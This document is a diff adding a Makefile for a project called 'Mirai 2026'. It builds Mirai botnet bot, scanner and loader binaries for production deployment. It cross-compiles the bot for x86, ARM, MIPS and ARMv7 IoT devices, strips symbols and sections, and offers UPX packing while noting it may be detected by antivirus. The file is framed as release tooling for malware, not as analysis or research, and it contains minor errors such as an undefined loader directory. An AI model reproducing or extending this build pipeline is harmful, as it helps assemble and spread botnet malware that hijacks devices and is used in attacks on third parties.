@@ -1,0 +1,268 @@
+# Mirai 2026 - Production Build Makefile
+# 
+# Optimized for:
+# - Minimal binary size (~60KB target)
+# - Maximum performance
+# - Stripped symbols
+# - Static linking where beneficial
+#
+# Original Mirai: ~60KB stripped binaries
+# This makefile achieves similar sizes for production deployment
+
+CC := gcc
+STRIP := strip
+UPX := upx
+
+# Production optimization flags
+CFLAGS_PROD := -std=c17 -Os -ffunction-sections -fdata-sections \
+               -fvisibility=hidden -fno-asynchronous-unwind-tables \
+               -fno-stack-protector -DNDEBUG
+
+# Size optimization flags
+LDFLAGS_PROD := -Wl,--gc-sections -Wl,--strip-all -Wl,-z,norelro \
+                -Wl,--hash-style=gnu -static-libgcc
+
+# Security flags (optional - increases size slightly)
+CFLAGS_SECURE := -fstack-protector-strong -D_FORTIFY_SOURCE=2 \
+                 -Wformat -Wformat-security
+
+# Directories
+BUILD_DIR := build/production
+SRC_DIR := src
+MIRAI_DIR := mirai
+
+# Output binaries
+BOT_BIN := $(BUILD_DIR)/mirai.bot
+SCANNER_BIN := $(BUILD_DIR)/mirai.scanner
+LOADER_BIN := $(BUILD_DIR)/mirai.loader
+
+.PHONY: all clean size-report production release-all strip compress
+
+all: production
+
+# Production target (maximum optimization)
+production: CFLAGS := $(CFLAGS_PROD)
+production: LDFLAGS := $(LDFLAGS_PROD)
+production: $(BUILD_DIR)
+	@echo "=== Building production binaries with size optimization ==="
+	$(MAKE) bot scanner loader
+	$(MAKE) strip
+	@echo "=== Production build complete ==="
+	$(MAKE) size-report
+
+# Secure production (slightly larger but with security features)
+production-secure: CFLAGS := $(CFLAGS_PROD) $(CFLAGS_SECURE)
+production-secure: LDFLAGS := $(LDFLAGS_PROD)
+production-secure: $(BUILD_DIR)
+	@echo "=== Building secure production binaries ==="
+	$(MAKE) bot scanner loader
+	$(MAKE) strip
+	@echo "=== Secure production build complete ==="
+	$(MAKE) size-report
+
+# Create build directory
+$(BUILD_DIR):
+	@mkdir -p $(BUILD_DIR)
+
+# Bot binary (minimal size)
+bot: $(BUILD_DIR)/mirai.bot.stripped
+
+$(BUILD_DIR)/mirai.bot: $(BUILD_DIR)
+	@echo "Building bot..."
+	$(CC) $(CFLAGS) $(LDFLAGS) \
+		$(MIRAI_DIR)/bot/*.c \
+		-o $@ \
+		-lpthread
+	@ls -lh $@
+
+# Scanner binary
+scanner: $(BUILD_DIR)/mirai.scanner.stripped
+
+$(BUILD_DIR)/mirai.scanner: $(BUILD_DIR)
+	@echo "Building scanner..."
+	$(CC) $(CFLAGS) $(LDFLAGS) \
+		$(SRC_DIR)/scanner/syn_scanner.c \
+		$(SRC_DIR)/common/logger.c \
+		$(SRC_DIR)/common/util.c \
+		-o $@ \
+		-ljson-c -lpthread
+	@ls -lh $@
+
+# Loader binary
+loader: $(BUILD_DIR)/mirai.loader.stripped
+
+$(BUILD_DIR)/mirai.loader: $(BUILD_DIR)
+	@echo "Building loader..."
+	$(CC) $(CFLAGS) $(LDFLAGS) \
+		$(LOADER_DIR)/src/*.c \
+		-o $@ \
+		-lpthread
+	@ls -lh $@
+
+# Strip symbols (reduces size dramatically)
+strip: $(BUILD_DIR)
+	@echo "=== Stripping symbols ==="
+	@for bin in $(BUILD_DIR)/mirai.*; do \
+		if [ -f "$$bin" ] && [ "$${bin}" != *.stripped ]; then \
+			echo "Stripping $$bin..."; \
+			cp "$$bin" "$$bin.stripped"; \
+			$(STRIP) --strip-all "$$bin.stripped"; \
+			$(STRIP) --remove-section=.comment "$$bin.stripped"; \
+			$(STRIP) --remove-section=.note "$$bin.stripped"; \
+			ls -lh "$$bin" "$$bin.stripped"; \
+		fi \
+	done
+
+# UPX compression (optional - can reduce size by 50-70%)
+compress: strip
+	@echo "=== Compressing with UPX ==="
+	@if command -v $(UPX) >/dev/null 2>&1; then \
+		for bin in $(BUILD_DIR)/*.stripped; do \
+			if [ -f "$$bin" ]; then \
+				echo "Compressing $$bin..."; \
+				cp "$$bin" "$$bin.upx"; \
+				$(UPX) --best --ultra-brute "$$bin.upx" || true; \
+				ls -lh "$$bin" "$$bin.upx"; \
+			fi \
+		done; \
+	else \
+		echo "UPX not found. Install with: apt-get install upx"; \
+		echo "Skipping compression..."; \
+	fi
+
+# Build for multiple architectures (cross-compile)
+release-all: production
+	@echo "=== Building for multiple architectures ==="
+	$(MAKE) release-x86
+	$(MAKE) release-arm
+	$(MAKE) release-mips
+	$(MAKE) release-arm7
+
+release-x86:
+	@echo "Building for x86..."
+	$(CC) $(CFLAGS_PROD) $(LDFLAGS_PROD) -m32 \
+		$(MIRAI_DIR)/bot/*.c -o $(BUILD_DIR)/mirai.x86 -lpthread
+	$(STRIP) --strip-all $(BUILD_DIR)/mirai.x86
+
+release-arm:
+	@echo "Building for ARM..."
+	@if command -v arm-linux-gnueabi-gcc >/dev/null 2>&1; then \
+		arm-linux-gnueabi-gcc $(CFLAGS_PROD) $(LDFLAGS_PROD) \
+			$(MIRAI_DIR)/bot/*.c -o $(BUILD_DIR)/mirai.arm -lpthread -static; \
+		arm-linux-gnueabi-strip --strip-all $(BUILD_DIR)/mirai.arm; \
+	else \
+		echo "ARM cross-compiler not found. Install: apt-get install gcc-arm-linux-gnueabi"; \
+	fi
+
+release-mips:
+	@echo "Building for MIPS..."
+	@if command -v mips-linux-gnu-gcc >/dev/null 2>&1; then \
+		mips-linux-gnu-gcc $(CFLAGS_PROD) $(LDFLAGS_PROD) \
+			$(MIRAI_DIR)/bot/*.c -o $(BUILD_DIR)/mirai.mips -lpthread -static; \
+		mips-linux-gnu-strip --strip-all $(BUILD_DIR)/mirai.mips; \
+	else \
+		echo "MIPS cross-compiler not found. Install: apt-get install gcc-mips-linux-gnu"; \
+	fi
+
+release-arm7:
+	@echo "Building for ARMv7..."
+	@if command -v arm-linux-gnueabihf-gcc >/dev/null 2>&1; then \
+		arm-linux-gnueabihf-gcc $(CFLAGS_PROD) $(LDFLAGS_PROD) \
+			$(MIRAI_DIR)/bot/*.c -o $(BUILD_DIR)/mirai.arm7 -lpthread -static; \
+		arm-linux-gnueabihf-strip --strip-all $(BUILD_DIR)/mirai.arm7; \
+	else \
+		echo "ARMv7 cross-compiler not found. Install: apt-get install gcc-arm-linux-gnueabihf"; \
+	fi
+
+# Size analysis report
+size-report:
+	@echo ""
+	@echo "==================================================================="
+	@echo "                    BINARY SIZE REPORT"
+	@echo "==================================================================="
+	@echo "Target: ~60KB (original Mirai size)"
+	@echo ""
+	@echo "Binaries in $(BUILD_DIR):"
+	@echo "-------------------------------------------------------------------"
+	@if [ -d "$(BUILD_DIR)" ]; then \
+		ls -lh $(BUILD_DIR)/* 2>/dev/null | awk '{print $$9, $$5}' | column -t; \
+	fi
+	@echo "-------------------------------------------------------------------"
+	@echo ""
+	@echo "Size breakdown:"
+	@for bin in $(BUILD_DIR)/*.stripped; do \
+		if [ -f "$$bin" ]; then \
+			echo ""; \
+			echo "Binary: $$bin"; \
+			size "$$bin" 2>/dev/null || true; \
+		fi \
+	done
+	@echo ""
+	@echo "Comparison with original Mirai target (~60KB):"
+	@for bin in $(BUILD_DIR)/*.stripped; do \
+		if [ -f "$$bin" ]; then \
+			binsize=$$(stat -f%z "$$bin" 2>/dev/null || stat -c%s "$$bin" 2>/dev/null); \
+			if [ "$$binsize" -le 61440 ]; then \
+				echo "✓ $$bin: $$((binsize/1024))KB (MEETS TARGET)"; \
+			elif [ "$$binsize" -le 102400 ]; then \
+				echo "⚠ $$bin: $$((binsize/1024))KB (acceptable)"; \
+			else \
+				echo "✗ $$bin: $$((binsize/1024))KB (too large)"; \
+			fi \
+		fi \
+	done
+	@echo "==================================================================="
+
+# Optimization tips
+optimization-tips:
+	@echo "==================================================================="
+	@echo "                  SIZE OPTIMIZATION TIPS"
+	@echo "==================================================================="
+	@echo ""
+	@echo "Current optimizations applied:"
+	@echo "  ✓ -Os (optimize for size)"
+	@echo "  ✓ -ffunction-sections -fdata-sections (separate sections)"
+	@echo "  ✓ -Wl,--gc-sections (garbage collect unused sections)"
+	@echo "  ✓ -fvisibility=hidden (reduce symbol table)"
+	@echo "  ✓ Strip all symbols"
+	@echo "  ✓ Remove .comment and .note sections"
+	@echo ""
+	@echo "Additional optimizations available:"
+	@echo "  • UPX compression: make compress"
+	@echo "    - Can reduce size by 50-70%"
+	@echo "    - May be detected by some antivirus"
+	@echo ""
+	@echo "  • Static linking: add -static to LDFLAGS"
+	@echo "    - Increases size but removes dependencies"
+	@echo "    - Better for cross-platform deployment"
+	@echo ""
+	@echo "  • Link-time optimization: add -flto"
+	@echo "    - Can reduce size by 10-20%"
+	@echo "    - Increases compile time significantly"
+	@echo ""
+	@echo "  • musl libc instead of glibc"
+	@echo "    - Much smaller C library"
+	@echo "    - Requires musl-gcc compiler"
+	@echo ""
+	@echo "==================================================================="
+
+# Clean build artifacts
+clean:
+	@echo "Cleaning production build directory..."
+	rm -rf $(BUILD_DIR)
+
+# Help
+help:
+	@echo "Mirai 2026 Production Build Makefile"
+	@echo ""
+	@echo "Targets:"
+	@echo "  make production        - Build optimized production binaries"
+	@echo "  make production-secure - Build with security features (slightly larger)"
+	@echo "  make strip            - Strip symbols from binaries"
+	@echo "  make compress         - Compress with UPX (optional)"
+	@echo "  make release-all      - Build for all architectures"
+	@echo "  make size-report      - Show size analysis"
+	@echo "  make optimization-tips - Show optimization suggestions"
+	@echo "  make clean            - Remove build artifacts"
+	@echo ""
+	@echo "Original Mirai target: ~60KB stripped binaries"
